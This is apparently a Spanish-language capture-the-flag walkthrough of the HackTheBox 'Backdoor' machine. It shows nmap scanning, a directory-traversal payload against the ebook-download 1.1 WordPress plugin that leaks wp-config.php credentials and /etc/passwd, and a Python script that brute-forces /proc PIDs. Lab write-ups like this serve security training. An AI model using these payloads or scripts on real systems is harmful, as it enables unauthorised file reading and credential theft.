#by d4l1


<p align= "center">
<img src=https://7rocky.github.io/images/HTB/Backdoor/Backdoor.webp>
</p>


# PRESENTACIÓN
Muy buenas hoy haremos la máquina Backdoor, una máquina linux easy, en la que encontraremos un Wordpress con un plugin instalado con una vulnerabilidad de directory transversal.

# ENUMERACIÓN

Como siempre haremos los pasos mas simples e importantes.

```
ping -c 1 ip

python3 escanerSO.py ip

```
Conociendo esto ya podemos pasar a hacer un escaner de la red

```
sudo nmap -sCV -T4 --min-rate 5000 ip
```
Con este escaneo encontramos los puertos típicos abiertos "22" ssh - "80" - http y "1337" 

# ENUMERACIÓN WEB

Si inspeccionamor por la web, nos damos cuenta rapidamente que es un blog de Wordpress, podemos utilizar "Wapalanyzer" para ver los plugins y podemos manualmente irnos a la ruta de los plugins. 
```
/wp-content/plugins .
```
Si no vamos ahi encontramos como un pequeño directorio, inspeccionemos.

Dentro del directorio ebook y el fichero readmne.txt nos revela un plugin con la versión 1.1 interesante.

# ENTRADA

Una vez que tenemos la versión podemos buscar exploits en google "ebook-download 1.1 wordpress plugin exploit"

Vemos que hay un exploit con "directory traversal" 

Con un ejemplo de uso :
```
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wpconfig.php
```
Deberemos meternos a la URL anteriormente mencionada, y especificar el target "ebookdownloadurl" 

```
backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```
Si ponemos dicha ruta, se nos descarga el archibo "wp-config.php" bastante importante.

Vamos a probar a abrir BurpSuite y posteriomente coger la request si lo pasamos por el repeter conseguimos esto.

```
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```
Ahora podemos hacer lo mismo pero con diferentes rutas, por ejemplo /etc/passwd

```
GET /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd HTTP/1.1
```
Aquí nos encontramos con el usuario "user"

# PUERTO 1337

Ahora nos vamos al puerto anteirormente que hemos visto abierto, nos intentaremos conectar con "telnet" o "netcat" 

Algo importante que encontramos es "/proc/{PID}/cmdline" (es un proceso que esta funcionando en el puerto 1337)

Lo que vamos a probar, es desde la misma request del BurpSuite apuntar a dicho proceso 

El archivo nos devuelve un proceso en PID

## FUERZA BRUTA PID 

Ahora utilizaremos python para hacer un pequeño script para que en bucle mande request a la máquina victima, para ver su respuesta mas comprensible, haremos por fuerza bruta de rango 1-1000 y en caso que no nos devuelva nada aumente su rango.
```
import requests
for i in range(1, 1000):
 r = requests.get("http://backdoor.htb/wp-content/plugins/ebookdownload/filedownload.php?ebookdownloadurl=/proc/"+str(i)+"/cmdline")
 out = (r.text.replace('/proc/'+str(i)+'/cmdline','').replace('<script>window.close()
</script>','').replace('\00',' '))
 if len(out)>1:
 print("PID"+str(i)+" : "+out)
```

